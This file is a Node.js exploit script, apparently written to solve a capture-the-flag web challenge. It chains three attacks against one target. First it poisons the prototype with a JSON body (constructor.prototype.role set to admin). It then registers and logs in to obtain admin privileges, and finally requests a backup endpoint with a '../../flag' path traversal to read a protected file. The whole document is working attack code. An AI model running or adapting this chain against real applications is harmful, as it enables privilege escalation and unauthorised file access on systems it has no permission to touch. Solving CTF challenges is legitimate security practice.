
const http = require('http');

// 1. Poison prototype first
const poisonData = JSON.stringify({
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const poisonOptions = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/api/profile',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(poisonData)
  }
};

console.log("Step 1: Poison prototype...");
const poisonReq = http.request(poisonOptions, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Poison done, step 2: register user with role=admin");
    const querystring = require('querystring');
    const postData = querystring.stringify({
      "username": "finaladmin",
      "role": "admin"
    });

    const regOptions = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/register',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const regReq = http.request(regOptions, (res) => {
      let regBody = '';
      res.on('data', chunk => regBody += chunk);
      res.on('end', () => {
        console.log("\nRegistration done:");
        let match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
        if (match) {
          let uid = match[1];
          console.log("Got UID: " + uid);
          console.log("Step 3: Login and check");
          loginAndGetFlag(uid);
        }
      });
    });
    regReq.write(postData);
    regReq.end();
  });
});
poisonReq.on('error', err => console.error(err));
poisonReq.write(poisonData);
poisonReq.end();


function loginAndGetFlag(uid) {
  const querystring = require('querystring');
  const postData = querystring.stringify({uid: uid});
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    // Visit dashboard to check role
    getPage('/dashboard', cookie, (dashboardBody) => {
      console.log("\nDashboard:");
      console.log(dashboardBody);
      // Check if we have admin tag
      if (dashboardBody.includes('tag.admin')) {
        console.log("\n✅ Got admin role! Looking for backup...");
        // The backup is accessible when you are admin, let's check the button is enabled now
        // Let's try GET /backup, /api/backup, then POST
        getPage('/backup', cookie, (backupRes) => {
          if (!backupRes.includes('404') && !backupRes.includes('Access Denied')) {
            console.log("\n🏁 Backup response:");
            console.log(backupRes);
            return;
          }
          getPage('/api/backup', cookie, (apiRes) => {
            if (!apiRes.includes('404')) {
              console.log("\n🏁 /api/backup:");
              console.log(apiRes);
            } else {
              // Try POST to /api/backup with file=../../flag
              postBackup(cookie);
            }
          });
        });
      }
    });
  });
  req.write(postData);
  req.end();
}

function getPage(path, cookie, callback) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: path,
    method: 'GET',
    headers: {
      'Cookie': cookie
    }
  };
  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => callback(body));
  });
  req.end();
}

function postBackup(cookie) {
  const querystring = require('querystring');
  const postData = querystring.stringify({file: '../../flag'});
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Cookie': cookie,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\n🏁 Final result POST /api/backup:");
      console.log(body);
    });
  });
  req.write(postData);
  req.end();
}
